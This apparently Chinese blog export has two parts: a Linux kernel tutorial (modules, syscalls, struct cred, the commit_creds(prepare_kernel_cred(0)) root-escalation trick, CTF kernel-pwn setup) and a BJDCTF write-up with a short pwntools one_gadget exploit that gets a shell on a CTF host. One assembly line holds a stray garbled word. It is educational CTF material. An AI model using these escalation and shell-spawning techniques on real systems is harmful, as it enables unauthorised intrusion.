<h4 id="微内核"><a href="#微内核" class="headerlink" title="微内核"></a>微内核</h4><p>微内核的功能被划分为多个独立的过程，每个过程叫做一个服务器</p>
<p>Linux是一个单内核，但是它汲取了微内核的精华：其引以为豪的是模块化设计，抢占式内核，支持内核线程以及动态装载内核模块的能力。</p>
<h2 id="2-模块简介"><a href="#2-模块简介" class="headerlink" title="2 模块简介"></a>2 模块简介</h2><p>内核模块是Linux内核向外部提供的一个插口，其全称为动态可加载内核模块（Loadable Kernel Module，LKM），我们简称为模块。Linux内核之所以提供模块机制，是因为它本身是一个单内核（monolithic kernel）。单内核的最大优点是效率高，因为所有的内容都集成在一起，但其缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p>
<h3 id="2-1-什么是模块"><a href="#2-1-什么是模块" class="headerlink" title="2.1 什么是模块"></a>2.1 什么是模块</h3><p>模块是具有独立功能的程序，它可以被单独编译，但不能独立运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户空间的进程是不同的。模块通常由一组函数和数据结构组成，用来实现一种文件系统、一个驱动程序或其他内核上层的功能</p>
<h3 id="2-2-编写一个简单的模块"><a href="#2-2-编写一个简单的模块" class="headerlink" title="2.2 编写一个简单的模块"></a>2.2 编写一个简单的模块</h3><p>模块和内核都在内核空间运行，模块编程在一定意义上说就是内核编程。因为内核版本的每次变化，其中的某些函数名也会相应地发生变化，因此模块编程与内核版本密切相关。以下例子针对2.6内核</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hellomod.c</span><br><span class="line"><span class="comment">// hello world driver for Linux 2.6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="comment">/* 必要的头文件*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">lkp_init</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(“&lt;<span class="number">1</span>&gt;Hello,World! from the kernel space…\n”);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">lkp_cleanup</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(“&lt;<span class="number">1</span>&gt;Goodbye, World! leaving kernel space…\n”);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">module_init(lkp_init);</span><br><span class="line">module_exit(lkp_cleanup);</span><br><span class="line">MODULE_LICENSE(“GPL”);</span><br></pre></td></tr></table></figure>

<p>说明 </p>
<ul>
<li>第4行：所有模块都要使用头文件module.h，此文件必须包含进来。</li>
<li>第5行：头文件kernel.h包含了常用的内核函数。第6行：头文件init.h包含了宏_init和_exit，它们允许释放内核占用的内存。建议浏览一下该文件中的代码和注释。</li>
<li>第9-12行：这是模块的初始化函数，它必需包含诸如要编译的代码、初始化数据结构等内容。第11行使用了printk()函数，该函数是由内核定义的，功能与C库中的printf()类似，它把要打印的信息输出到终端或系统日志。字符串中的&lt;1&gt;是输出的级别，表示立即在终端输出。</li>
<li>第15-18行：这是模块的退出和清理函数。此处可以做所有终止该驱动程序时相关的清理工作。</li>
<li>第20行：这是驱动程序初始化的入口点。对于内置模块，内核在引导时调用该入口点；对于可加载模块则在该模块插入内核时才调用。第21行：对于可加载模块，内核在此处调用module_cleanup（）函数，而对于内置的模块，它什么都不做。第22行：提示可能没有GNU公共许可证。有几个宏是在2.4版的内核中才开发的（详情参见modules.h）。函数module_init()和cleanup_exit()是模块编程中最基本也是必须的两个函数。module_init()向内核注册模块所提供的新功能，而cleanup_exit()注销由模块提供的所有功能。</li>
</ul>
<h3 id="2-3-应用程序与内核模块的比较"><a href="#2-3-应用程序与内核模块的比较" class="headerlink" title="2.3 应用程序与内核模块的比较"></a>2.3 应用程序与内核模块的比较</h3><table>
<thead>
<tr>
<th></th>
<th>C语言应用程序</th>
<th>内核模块程序</th>
</tr>
</thead>
<tbody><tr>
<td>使用函数</td>
<td>Libc库</td>
<td>内核函数</td>
</tr>
<tr>
<td>运行空间</td>
<td>用户空间</td>
<td>内核空间</td>
</tr>
<tr>
<td>运行权限</td>
<td>普通用户</td>
<td>超级用户</td>
</tr>
<tr>
<td>入口函数</td>
<td>main()</td>
<td>module_init()</td>
</tr>
<tr>
<td>出口函数</td>
<td>exit()</td>
<td>module_exit()</td>
</tr>
<tr>
<td>编译</td>
<td>Gcc –c</td>
<td>Makefile</td>
</tr>
<tr>
<td>链接</td>
<td>Gcc</td>
<td>insmod</td>
</tr>
<tr>
<td>运行</td>
<td>直接运行</td>
<td>insmod</td>
</tr>
<tr>
<td>调试</td>
<td>Gdb</td>
<td>kdbug, kdb,kgdb等</td>
</tr>
</tbody></table>
<p>从表一我们可以看出，内核模块程序不能调用libc库中的函数，它运行在内核空间，且只有超级用户可以对其运行。另外，模块程序必须通过module_init()和module-exit()函数来告诉内核“我来了”和“我走了”。</p>
<h3 id="2-4-内核符号表"><a href="#2-4-内核符号表" class="headerlink" title="2.4 内核符号表"></a>2.4 <em>内核符号表</em></h3><p><strong>如 前所述，Linux内核是一个整体结构，像一个圆球，而模块是插入到内核中的插件。尽管内核不是一个可安装模块，但为了方便起见，Linux把内核也看作 一个“母”模块。那么模块与模块之间如何进行交互呢，一种常用的方法就是共享变量和函数。但并不是模块中的每个变量和函数都能被共享，内核只把各个模块中 主要的变量和函数放在一个特定的区段，这些变量和函数就统称为符号。到低哪些符号可以被共享？ Linux内核有自己的规定。对于内核这个特殊的母模块，在kernel/ksyms.c中定义了从中可以“移出”的符号，例如进程管理子系统可以“移出”的符号定义如下</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 进程管理 */</span></span><br><span class="line"></span><br><span class="line">EXPORT_SYMBOL(do_mmap_pgoff);</span><br><span class="line"></span><br><span class="line">EXPORT_SYMBOL(do_munmap);</span><br><span class="line"></span><br><span class="line">EXPORT_SYMBOL(do_brk);</span><br><span class="line"></span><br><span class="line">EXPORT_SYMBOL(exit_mm);</span><br><span class="line"></span><br><span class="line">…</span><br><span class="line"></span><br><span class="line">EXPORT_SYMBOL(schedule);</span><br><span class="line"></span><br><span class="line">EXPORT_SYMBOL(jiffies);</span><br><span class="line"></span><br><span class="line">EXPORT_SYMBOL(xtime);</span><br><span class="line"></span><br><span class="line">…</span><br></pre></td></tr></table></figure>

<p>其中宏定义EXPORT_SYMBOL（）本身的含义是“移出符号”。为什么说是“移出”呢？因为这些符号本来是内核内部的符号，通过这个宏放在一个公开的地方，使得装入到内核中的其他模块可以引用它们。</p>
<p>实际上，仅仅知道这些符号的名字是不够的，还得知道它们在内核地址空间中的地址才有意义。因此，内核中定义了如下结构来描述模块的符号：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module_symbol</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> value; ／*符号在内核地址空间中的地址*/</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *name; <span class="comment">/*符号名*/</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>我们可以从/proc/ksyms文件中读取所有内核模块“移出”的符号，这所有符号就形成内核符号表，其格式如下：</p>
<p>内存地址 符号名 ［所属模块］</p>
<p>在模块编程中，可以根据符号名从这个文件中检索出其对应的地址，然后直接访问该地址从而获得内核数据。第三列“所属模块”指符号所在的模块名，对于从内核这一母模块移出的符号，这一列为空。</p>
<p>模块加载后，2.4内核下可通过 /proc/ksyms、 2.6 内核下可通过/proc/kallsyms查看模块输出的内核符号</p>
<h3 id="2-5-模块依赖"><a href="#2-5-模块依赖" class="headerlink" title="2.5 模块依赖"></a>2.5 模块依赖</h3><p>如前所述，内核符号表记录了所有模块可以访问的符号及相应的地址。当一个新的模块被装入内核后，它所申明的某些符号就会被登记到这个表中，而这些符号可能被其他模块所引用，这就引出了模块依赖这个问题。</p>
<p>一个模块A引用另一个模块B所移出的符号，我们就说模块B被模块A引用，或者说模块A依赖模块B。如果要链接模块A，必须先链接模块B。这种模块间相互依赖的关系就叫模块依赖。</p>
<h3 id="2-6-模块引用计数器"><a href="#2-6-模块引用计数器" class="headerlink" title="2.6 模块引用计数器"></a>2.6 模块引用计数器</h3><p>为 了确保模块安全地卸载，每个模块都有一个引用计数器。当执行模块所涉及的操作时就递增计数器，在操作结束时就递减这个计数器；另外，当模块B被模块A引用 时，模块B的引用计数就递增，引用结束，计数器递减。什么时候可以卸载这个模块？当然只有这个计数器值为0的时候，例如，当一个文件系统还被安装在系统上 时就不能将其卸载，当这个文件系统不再被使用时，引用计数器就为0，于是可以卸载。</p>
<h3 id="2-7-模块编译"><a href="#2-7-模块编译" class="headerlink" title="2.7 模块编译"></a>2.7 模块编译</h3><p>有了Makefile,执行make命令，会自动形成相关的后缀为.o和.ko文件。<br>到此，模块编译好了，该把它插入到内核了：<br>如：$insmod hellomod.ko</p>
<p> 当然，要以系统员的身份才能把模块插入。</p>
<p> 成功插入后，可以通过dmesg命令查看，屏幕最后几行的输出就是你程序中输出的内容：Hello,World! from the kernel space…</p>
<p>当模块不再需要时，可以通过rmmod命令移去，例如</p>
<p><em>$rmmod hellomod</em></p>
<h2 id="3-系统调用"><a href="#3-系统调用" class="headerlink" title="3 系统调用"></a>3 系统调用</h2><p>系统调用，顾名思义，说的是操作系统提供给用户程序调用的一组“特殊”接口。用户程序可以通过这组“特殊”接口来获得操作系统内核提供的服务，比如用户可以通过文件系统相关的调用请求系统打开文件、关闭文件或读写文件，可以通过时钟相关的系统调用获得系统时间或设置定时器等。</p>
<h3 id="3-1-Linux-的系统调用"><a href="#3-1-Linux-的系统调用" class="headerlink" title="3.1 Linux 的系统调用"></a>3.1 Linux 的系统调用</h3><p>下一个需要解释一下的问题是内核函数和系统调用的关系。大家不要把内核函数想像的过于复杂，其实它们和普通函数很像，只不过在内核实现，因此要满足一些内核编程的要求[3]。系统调用是一层用户进入内核的接口，它本身并非内核函数，进入内核后，不同的系统调用会找到对应到各自的内核函数——换个专业说法就叫：系统调用服务例程。实际上针对请求提供服务的是内核函数而非调用接口。</p>
<p>比如系统调用 getpid实际上就是调用内核函数sys_getpid。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_getpid</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> current-&gt;tpid;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总而言之，从用户角度向内核看，依次是系统命令、编程接口、系统调用和内核函数。在讲述了系统调用实现后，我们会回过头来看看整个执行路径。</p>
<h2 id="4-状态切换"><a href="#4-状态切换" class="headerlink" title="4 状态切换"></a>4 状态切换</h2><h3 id="4-1-user-space-to-kernel-space"><a href="#4-1-user-space-to-kernel-space" class="headerlink" title="4.1 user space to kernel space"></a>4.1 user space to kernel space</h3><p>当发生 <code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code>等事件时，会发生用户态到内核态的切换，具体的过程为：</p>
<ol>
<li>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</li>
<li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</li>
<li>通过 push 保存各寄存器值，具体的 <a href="http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S" target="_blank" rel="noopener">代码</a> 如下:</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> ENTRY(entry_SYSCALL_64)</span><br><span class="line"> /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line">    </span><br><span class="line"> /* 保存栈值，并设置内核栈 */</span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span><br><span class="line">/* Construct struct pt_regs on stack */</span><br><span class="line">pushq  $__USER_DS      /* pt_regs-&gt;ss */</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS      /* pt_regs-&gt;cs */</span><br><span class="line">pushq  %rcx             /* pt_regs-&gt;ip */</span><br><span class="line">pushq  %rax             /* pt_regs-&gt;orig_ax */</span><br><span class="line">pushq  %rdi             /* pt_regs-&gt;di */</span><br><span class="line">pushq  %rsi             /* pt_regs-&gt;si */</span><br><span class="line">pushq  %rdx             /* pt_regs-&gt;dx */</span><br><span class="line">pushq  %rcx tuichu    /* pt_regs-&gt;cx */</span><br><span class="line">pushq  $-ENOSYS        /* pt_regs-&gt;ax */</span><br><span class="line">pushq  %r8              /* pt_regs-&gt;r8 */</span><br><span class="line">pushq  %r9              /* pt_regs-&gt;r9 */</span><br><span class="line">pushq  %r10             /* pt_regs-&gt;r10 */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;r11 */</span><br><span class="line">sub $(6*8), %rsp      /* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>通过汇编指令判断是否为 x32_abi。</p>
</li>
<li><p>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</p>
</li>
</ol>
<h3 id="4-2-kernel-space-to-user-space"><a href="#4-2-kernel-space-to-user-space" class="headerlink" title="4.2 kernel space to user space"></a>4.2 kernel space to user <strong>space</strong></h3><p>退出时，流程如下：</p>
<ol>
<li>通过 <code>swapgs</code> 恢复 GS 值</li>
<li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</li>
</ol>
<h3 id="4-3-struct-cred"><a href="#4-3-struct-cred" class="headerlink" title="4.3 struct cred"></a>4.3 struct cred</h3><p>之前提到 kernel 记录了进程的权限，更具体的，是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。</p>
<p><a href="https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred" target="_blank" rel="noopener">源码</a> 如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<h2 id="5-内核态函数"><a href="#5-内核态函数" class="headerlink" title="5 内核态函数"></a>5 内核态函数</h2><p>相比用户态库函数，内核态的函数有了一些变化</p>
<ul>
<li>printf() -&gt; <strong>printk()</strong>，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</li>
<li>memcpy() -&gt;<strong>copy_from_user()/copy_to_user()</strong><ul>
<li>copy_from_user() 实现了将用户空间的数据传送到内核空间</li>
<li>copy_to_user() 实现了将内核空间的数据传送到用户空间</li>
</ul>
</li>
<li>malloc() -&gt; <strong>kmalloc()</strong>，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code></li>
<li>free() -&gt; <strong>kfree()</strong>，同 kmalloc()</li>
</ul>
<p>另外要注意的是，<code>kernel 管理进程，因此 kernel 也记录了进程的权限</code>。kernel 中有两个可以方便的改变权限的函数：</p>
<ul>
<li><strong>int commit_creds(struct cred *new)</strong></li>
<li><strong>struct cred* prepare_kernel_cred(struct task_struct* daemon)</strong></li>
</ul>
<p>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 root 权限（root 的 uid，gid 均为 0）</p>
<p>执行 <code>commit_creds(prepare_kernel_cred(0))</code> 也是最常用的提权手段，两个函数的地址都可以在 <code>/proc/kallsyms</code> 中查看（较老的内核版本中是 <code>/proc/ksyms</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post sudo grep commit_creds /proc/kallsyms </span><br><span class="line">[sudo] m4x 的密码：</span><br><span class="line">ffffffffbb6af9e0 T commit_creds</span><br><span class="line">ffffffffbc7cb3d0 r __ksymtab_commit_creds</span><br><span class="line">ffffffffbc7f06fe r __kstrtab_commit_creds</span><br><span class="line">post sudo grep prepare_kernel_cred /proc/kallsyms</span><br><span class="line">ffffffffbb6afd90 T prepare_kernel_cred</span><br><span class="line">ffffffffbc7d4f20 r __ksymtab_prepare_kernel_cred</span><br><span class="line">ffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred</span><br></pre></td></tr></table></figure>

<h2 id="6-Ctf-kernel-Pwn-相关"><a href="#6-Ctf-kernel-Pwn-相关" class="headerlink" title="6 Ctf kernel Pwn 相关"></a>6 Ctf kernel Pwn 相关</h2><p>一般会给以下三个文件</p>
<ol>
<li>boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关</li>
<li>bzImage: kernel binary</li>
<li>rootfs.cpio: 文件系统映像</li>
</ol>
<p>比如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CISCN2017_babydriver [master●] ls</span><br><span class="line">babydriver.tar</span><br><span class="line">CISCN2017_babydriver [master●] x babydriver.tar</span><br><span class="line">boot.sh</span><br><span class="line">bzImage</span><br><span class="line">rootfs.cpio</span><br><span class="line">CISCN2017_babydriver [master●] ls</span><br><span class="line">babydriver.tar  boot.sh  bzImage  rootfs.cpio</span><br><span class="line">CISCN2017_babydriver [master●] file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) <span class="comment">#1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA</span></span><br><span class="line">CISCN2017_babydriver [master●] file rootfs.cpio</span><br><span class="line">rootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15 2017, max compression, from Unix, original size 2844672</span><br><span class="line">CISCN2017_babydriver [master●] file boot.sh</span><br><span class="line">boot.sh: Bourne-Again shell script, ASCII text executable</span><br><span class="line">CISCN2017_babydriver [master●] bat boot.sh </span><br><span class="line">───────┬─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: boot.sh</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ <span class="comment">#!/bin/bash</span></span><br><span class="line">   2   │ </span><br><span class="line">   3   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="string">'console=ttyS0 ro</span></span><br><span class="line"><span class="string">       │ ot=/dev/ram oops=panic panic=1'</span> -<span class="built_in">enable</span>-kvm -monitor /dev/null -m 64M --nographi</span><br><span class="line">       │ c  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br><span class="line">───────┴─────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>

<p>解释一下 qemu 启动的参数：</p>
<ul>
<li>-initrd rootfs.cpio，使用 rootfs.cpio 作为内核启动的文件系统</li>
<li>-kernel bzImage，使用 bzImage 作为 kernel 映像</li>
<li>-cpu kvm64,+smep，设置 CPU 的安全选项，这里开启了 smep</li>
<li>-m 64M，设置虚拟 RAM 为 64M，默认为 128M </li>
</ul>
<p>其他的选项可以通过 –help 查看。</p>
<ol start="4">
<li>本地写好 exploit 后，可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到 flag</li>
</ol>
<h2 id="5-常用指令"><a href="#5-常用指令" class="headerlink" title="5 常用指令"></a>5 常用指令</h2><p>解包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure>

<p>打包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../core.cpio</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc exp.c -static -masm=intel -g -o exp</span><br></pre></td></tr></table></figure>

<p>查看text段地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /sys/module/core/sections/.text</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内核</category>
      </categories>
      <tags>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF-writeup</title>
    <url>/year/03/22/cl7iordm90003293fbnruuy45/</url>
    <content><![CDATA[<p>BJDCTF的writeup，前几道题目都比较友好。</p>
<a id="more"></a>
<h2 id="1-one-gadget"><a href="#1-one-gadget" class="headerlink" title="1 one_gadget"></a>1 one_gadget</h2><h3 id="1-1-题目分析"><a href="#1-1-题目分析" class="headerlink" title="1.1 题目分析"></a>1.1 题目分析</h3><p><img src="/22/cl7iordm90003293fbnruuy45/1.png" alt><br>点开<code>init</code>函数，里面有一个泄露了<code>printf</code>的地址,是这个题目给的额外条件吧。</p>
<p>再看题目可知我们输入了一个地址，然后就直接执行那个地址就可以getshell，是不是很厉害，这就是one_gadget.</p>
<h3 id="1-2-关于one-gadget-更详细的介绍"><a href="#1-2-关于one-gadget-更详细的介绍" class="headerlink" title="1.2 关于one_gadget 更详细的介绍"></a>1.2 关于one_gadget 更详细的介绍</h3><p><code>one-gadget</code> 是<code>glibc</code>里调用<code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code>的一段非常有用的<code>gadget</code>。在我们能够控制ip（也就是pc）的时候，用<code>one-gadget</code>来做RCE（远程代码执行）非常方便，比如有时候我们能够做一个任意函数执行，但是做不到控制第一个参数，这样就没办法调用<code>system(&quot;sh&quot;)</code>，这个时候<code>one gadget</code>就可以搞定了。</p>
<p>我们一般用<a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">one_gadget</a>这个工具来寻找这样的gadget。</p>
<h3 id="1-3-如何利用工具寻找one-gadget"><a href="#1-3-如何利用工具寻找one-gadget" class="headerlink" title="1.3 如何利用工具寻找one_gadget"></a>1.3 如何利用工具寻找one_gadget</h3><ol>
<li><p>如果远程的libc版本和你本地一样，或者你想在本地试验时,先用<code>ldd 文件名</code>命令找到自己本地的<code>libc</code>目录<br><img src="/22/cl7iordm90003293fbnruuy45/2.png" alt></p>
<p> 然后再用刚才安装好的工具查看<code>libc</code>文件就可以找到<code>one_gadget</code>对于libc的偏移了。<br> <img src="/22/cl7iordm90003293fbnruuy45/3.png" alt></p>
</li>
<li><p>如果题目给你了它远程的<code>libc</code>文件的话,直接对那个<code>libc</code>文件使用就行<br><img src="/22/cl7iordm90003293fbnruuy45/4.png" alt></p>
</li>
</ol>
<h3 id="1-4-对于one-gadget的一点经验"><a href="#1-4-对于one-gadget的一点经验" class="headerlink" title="1.4 对于one_gadget的一点经验"></a>1.4 对于one_gadget的一点经验</h3><ul>
<li>那个红色<code>constraints</code>就是调用这个<code>gadget</code>需要满足的条件,一般64位的很好满足，32位的基本用不了。</li>
<li>一个用不了可以多试几个后面的。</li>
<li>前期栈题可能用到的不多，后面堆题经常用来作为劫持<code>malloc_hook</code>的内容，也可以配合<code>realloc_hook</code>来调整栈环境使得满足<code>one_gadget</code>的利用条件。<h3 id="1-5-exp"><a href="#1-5-exp" class="headerlink" title="1.5 exp"></a>1.5 exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#sh = process('./one_gadget')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.29.so'</span>)</span><br><span class="line">sh = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27231</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"here is the gift for u:"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">libc_base = int(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">16</span>) - libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">log.success(<span class="string">'libc_addr: '</span> + hex(libc_base))</span><br><span class="line">one_gadget = libc_base +<span class="number">0x106ef8</span></span><br><span class="line">sh.sendline(str(one_gadget))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ul>
